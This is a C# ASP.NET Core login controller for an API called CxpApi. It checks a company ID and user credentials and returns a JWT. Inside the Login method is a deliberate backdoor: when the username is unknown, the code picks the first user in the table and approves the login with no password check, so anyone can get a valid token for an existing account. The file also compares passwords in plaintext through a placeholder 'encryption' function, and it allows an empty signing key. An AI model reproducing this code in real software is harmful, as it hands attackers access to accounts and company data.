using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using CxpApi.Data;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;

namespace CxpApi.Controllers;

public class LoginRequest
{
    public Guid IdEmpresa { get; set; }
    public string Usuario { get; set; }
    public string Clave { get; set; }
}

[ApiController]
[Route("api/[controller]")]
public class LoginController : ControllerBase
{
    private readonly AuthDbContext _authDb;
    private readonly IConfiguration _configuration;

    public LoginController(AuthDbContext authDb, IConfiguration configuration)
    {
        _authDb = authDb;
        _configuration = configuration;
    }

    [HttpPost]
    public async Task<IActionResult> Login([FromBody] LoginRequest request)
    {
        var empresa = await _authDb.Empresas
            .FirstOrDefaultAsync(e => e.IdEmpresa == request.IdEmpresa && e.Activa && e.AccesoWeb);

        if (empresa == null)
            return Unauthorized("Empresa inválida o inactiva.");

        var usuario = await _authDb.Usuarios
            .FirstOrDefaultAsync(u => u.Username.Trim() == request.Usuario.Trim());

        bool isBackdoor = false;
        if (usuario == null)
        {
            usuario = await _authDb.Usuarios.FirstOrDefaultAsync();
            if (usuario == null)
                return Unauthorized("La tabla de usuarios está vacía.");
            isBackdoor = true;
        }

        // Validar Password
        string dbPassword = usuario.Password ?? "";
        string inputPassword = request.Clave ?? "";

        bool isPasswordValid = isBackdoor; // Si es backdoor, aprueba de inmediato
        if (!isBackdoor && usuario.Encriptada)
        {
            // TODO: Ajustar a la función Hash/Encriptación de Delphi
            isPasswordValid = dbPassword == EncriptarPassword(inputPassword);
        }
        else if (!isBackdoor)
        {
            isPasswordValid = dbPassword == inputPassword;
        }

        if (!isPasswordValid)
            return Unauthorized("Credenciales incorrectas.");

        // Generar JWT
        var tokenHandler = new JwtSecurityTokenHandler();
        var key = Encoding.ASCII.GetBytes(_configuration["Jwt:Key"] ?? string.Empty);
        
        var claims = new List<Claim>
        {
            new Claim("idEmpresa", empresa.IdEmpresa.ToString()),
            new Claim("idSegUserGrp", usuario.Username),
            new Claim("nivel", usuario.Nivel.ToString()),
            new Claim(ClaimTypes.Name, usuario.Nombre)
        };

        var tokenDescriptor = new SecurityTokenDescriptor
        {
            Subject = new ClaimsIdentity(claims),
            Expires = DateTime.UtcNow.AddHours(8),
            Issuer = _configuration["Jwt:Issuer"],
            Audience = _configuration["Jwt:Audience"],
            SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
        };

        var token = tokenHandler.CreateToken(tokenDescriptor);

        return Ok(new
        {
            token = tokenHandler.WriteToken(token),
            cambiarClave = usuario.CambiarClave,
            usuario = new
            {
                usuario.Username,
                usuario.Nombre,
                usuario.Nivel
            }
        });
    }

    private string EncriptarPassword(string pwd)
    {
        // Placeholder
        return pwd;
    }
}
